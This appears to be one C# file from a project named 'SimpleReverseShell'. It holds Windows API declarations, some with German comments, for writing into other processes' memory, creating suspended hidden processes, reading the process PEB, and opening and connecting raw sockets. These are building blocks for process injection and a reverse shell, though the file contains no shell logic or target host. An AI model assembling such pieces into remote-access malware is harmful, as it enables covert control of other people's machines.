using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SimpleReverseShell
{
  public class DllImportsBase
  {
    #region MemoryManagement
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    internal static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public uint dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }
    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
      public const uint CREATE_NO_WINDOW = 0x8000000;
      public const uint STARTF_USESTDHANDLES = 0x100;

    }
    public const int PROCESSBASICINFORMATION = 0;
    #endregion

    #region Sockets
    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    /// </summary>
    /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
    /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
    /// <param name="protocol">Protokoll. Wert von 6 entspricht tcp.</param>
    /// <param name="protocolInfo">Kann NULL sein.</param>
    /// <param name="group">Kann NULL sein.</param>
    /// <param name="dwFlags">Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort port);

    /// <summary>
    /// Importierte Methode um ein Socket zu connecten.
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
    /// </summary>
    /// <param name="socket">Das Socket.</param>
    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
    /// <param name="namelen">Länge der Sockaddr Struktur</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr socket, IntPtr name, int namelen);

    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern uint inet_addr(string ipAddress);

    /// <summary>
    /// Fragt den letzten Fehlercode ab. Eine Referenz zu Fehlercodes: https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
    /// </summary>
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern int WSAGetLastError();

    /// <summary>
    /// Initialisiert die Sockets, dass diese verwendet werden können.
    /// </summary>
    /// <param name="maxVersionRequired">Die max Version der Spezifikation die benutzt wird.</param>
    /// <param name="WSAData">Pointer auf die WSAData Struktur.</param>
    /// Doku: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern int WSAStartup(ushort maxVersionRequired, WSAData WSAData);

    [StructLayout(LayoutKind.Sequential)]
    public struct WSAData
    {
      ushort wVersion;
      ushort wHighVersion;
      ushort iMaxSockets;
      ushort iMaxUdpDg;
      IntPtr lpVendorInfo;
      byte[] szDescription;
      byte[] szSystemStatus;
      ushort iMaxUdpg;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {

      /// short
      public short sin_family;

      /// u_short->unsigned short
      public ushort sin_port;

      /// in_addr
      public in_addr sin_addr;

      /// char[8]
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
      public string sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct in_addr
    {
      public uint S_addr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr
    {
      public ushort sa_family;

      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
      public string sa_data;
    }
    #endregion
  }
}
